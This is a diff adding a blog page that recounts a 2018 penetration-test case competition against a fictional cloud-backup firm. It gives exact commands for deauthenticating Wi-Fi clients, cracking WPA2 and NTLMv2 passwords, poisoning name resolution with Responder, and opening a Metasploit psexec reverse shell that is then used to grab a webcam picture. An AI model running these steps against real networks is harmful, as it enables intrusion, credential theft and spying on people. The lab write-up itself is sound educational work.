@@ -1,0 +1,82 @@
+{% include 'header.html' %}
+
+<div class="date">06/09-2018</div>
+
+<h2>Case Competition</h2>
+
+<p>This scenario, was written as a case competition for a cyber security presentation. The presentation treated the scenario as a penetration test of an online company, offering backups in the cloud. The name of the company is Digi-Sikring ApS. No laws were broken in creating and documenting this scenario. All tests were performed on my private property.</p>
+
+<b> Part 1: Got wifi?</b>
+<p>To target the wireless network, let's enable monitor mode on the network interface card.</p>
+<pre class="code"><span class="host">root@parrot:~$ </span><span>sudo airmon-ng start wlan0</span></pre>
+<img class="img" src="/static/images/case-competition/monitor.png" alt="Monitor mode">
+<p>Next up, I'm scanning wireless networks with the network card in monitor mode.</p>
+<p>This is done with the following command:</p>
+<pre class="code"><span class="host">root@parrot:~$ </span>sudo airodump-ng wlan0mon</pre>
+<p>While scanning, a network called digisikringaps-2.4Ghz appears.</p>
+<img class="img" src="/static/images/case-competition/airodump.png" alt="Airodump">
+<p>The next step is to narrow down monitoring to the network in interest. With the following command, the network: digisikringaps-2.4Ghz is monitored, and the data is saved to the Desktop.</p>
+<pre class="code"><span class="host">root@parrot:~$ </span>sudo airodump-ng -c 1 --bssid E0:B9:E5:A5:4D:27 -w /home/root/Desktop/digisikringaps-wifi wlan0mon</pre>
+<img class="img" src="/static/images/case-competition/airodump_digi.png" alt="Airodump Digi Sikring ApS">
+<p>The files with the captured data are stored on the Desktop. The most important being the .cap file. However, It's far more interesting once it contains the four way handshake, which is the authentification method for network with WPA2 encryption.</p>
+<img class="img" src="/static/images/case-competition/capture_files.png" alt="Capture files">
+<p>To capture the four way handshake, a device is needed to authenticate with the network. Instead of waiting for said authentication, a deauthentication attack can be launched against connected devices. This forces devices off of the network. They will most likely auto-connect, enabling me to capture the handshake. To launch the deauthentication attack to the only device connected, the following command is executed:</p>
+<pre class="code"><span class="host">root@parrot:~$ </span>sudo aireplay-ng -0 2 -a E0:B9:E5:A5:4D:27 -c 84:29:99:18:CD:33 wlan0mon</pre>
+<p>The attack was succesful and the terminal monitoring the network now displays the capture of the four way handshake.</p>
+<img class="img" src="/static/images/case-competition/airodump_handshake.png" alt="Airodump handshake">
+<p>If the .cap-file is opened in Wireshark and the four way handshake can be seen. It employs EAPOL (extensible authentication protocol over LAN), which is the authentification protocol.</p>
+<img class="img" src="/static/images/case-competition/handshake_cap.png" alt="EAPOL capture">
+<p>The password within the .cap file, can be cracked with the aircrack software from the aircrack-ng suite. This allows the attacker to bruteforce the password with words from a password list.</p>
+<p>The command executed is as follows.</p>
+<pre class="code"><span class="host">root@parrot:~$ </span>sudo aircrack-ng -a2 -b E0:B9:E5:A5:4D:27 -w /usr/share/wordlists/fern-wifi/common.txt /home/root/Desktop/digisikringaps-wifi/*cap</pre>
+<p>Since the wireless network password is in the wordlist used, it is cracked within seconds.</p>
+<img class="img" src="/static/images/case-competition/aircrack.png" alt="Aircrack">
+<br><br>
+<b> Part 2: Houston, we have a shell</b>
+<p>After connecting to the network, I'd like to determine the default gateway in order to discover hosts connected to the network.</p>
+<pre class="code"><span class="host">root@parrot:~$ </span>route -n</pre>
+<img class="img" src="/static/images/case-competition/gateway.png" alt="Default Gateway">
+<p>The default gateway is 192.168.1.1. To discover connected hosts I'll scan every IP address on the network. To do this I'll use nmap.</p>
+<pre class="code"><span class="host">root@parrot:~$ </span>sudo nmap -sP -PI -PT 192.168.1.0/24</pre>
+<img class="img" src="/static/images/case-competition/nmap.png" alt="Nmap Scan">
+<p>The connected device with IP: 192.168.1.112, looks like a Windows machine. Let's target that. To attack the device, I'll use responder. When a non existing hostname is entered into a browser, the computer will ask other devices connected to the network, if they recognize the hostname. Responder tells the computer that itself is the IP behind the unrecognized hostname, resulting in the target computer is sending their login credentials. The name in cleartext and the password in a hashed with NTLMv2. </p>
+<pre class="code"><span class="host">root@parrot:~$ </span>sudo responder -I wlan0 -wv</pre>
+<img class="img" src="/static/images/case-competition/responder.png" width="90%" alt="Responder">
+<p>The hashes are stored in /usr/share/responder/logs.</p>
+<pre class="code"><span class="host">root@parrot:~$ </span>cd /usr/share/responder/logs </pre>
+<p>I'll use john the ripper to attempt cracking the NTLMv2 hash.</p>
+<pre class="code"><span class="host">root@parrot:</span><span class="dir">~/usr/share/responder/logs$ </span>john SMBv2-NTLMv2-SSP-192.168.1.112.txt</pre>
+<img class="img" src="/static/images/case-competition/john.png" alt="John the Ripper">
+<p>John cracked the NTLMv2 Hash in under a second. This emphasizes the importance of not relying on a weak password. Let's use the psexec module with a reverse shell as the payload.</p>
+
+<p>First some parameters must be set.</p>
+
+<pre class="code"><span class="host">root@parrot:~$ </span> msfconsole</pre>
+<pre class="code">msf > use exploit/windows/smb/psexec
+  msf exploit(<span class="host">windows/smb/psexec</span>) > set payload windows/meterpreter/reverse_tcp
+  msf exploit(<span class="host">windows/smb/psexec</span>) > set smbroot johs
+  msf exploit(<span class="host">windows/smb/psexec</span>) > set smbpass password1
+  msf exploit(<span class="host">windows/smb/psexec</span>) > set lhost 192.168.1.162
+  msf exploit(<span class="host">windows/smb/psexec</span>) > set rhost 192.168.1.112
+</pre>
+
+<p>And finally.</p>
+
+<pre class="code">msf exploit(<span class="host">windows/smb/psexec</span>) > exploit</pre>
+
+<img class="img" src="/static/images/case-competition/metasploit.png" alt="Meatsploit">
+<p>We're in. Printing working directory let's us know that we have a shell open in C:\Windows\System32.</p>
+<p>Furthermore, we can launch Armitage, a graphical root interface for the metasploit framework, and grab a picture through the webcam of the compromised computer.</p>
+<img class="img" src="/static/images/case-competition/armitage.png" alt="Armitage">
+<img class="img" src="/static/images/case-competition/webcam.png" alt="Webcam">
+<br><br>
+<b>Part 3: Correct horse battery stable</b>
+<p>The third part is an example of compromisation of an employee from the outside. Using maltego, we can search the employers name. An e-mail is associated with the name of the employee. Digging a little deeper, it appears that the e-mail of the employee has been in a password leak. </p>
+<img class="img" src="/static/images/case-competition/maltego.png" alt="Maltego" width="90%">
+<p>Obtaining the LinkedIn database let's ud find the SHA1 hash of used password.</p>
+<img class="img" src="/static/images/case-competition/linkedin.png" alt="LinkedIn">
+<p>The SHA1 hash is not considered safe as per 2018. Searching the hash in online databases, revealed that the hash indeed had been cracked.</p>
+<img class="img" src="/static/images/case-competition/sha1.png" alt="Maltego">
+<p>This concludes the hypothetical pentest done as a case competition.</p>
+
+{% include 'footer.html' %}
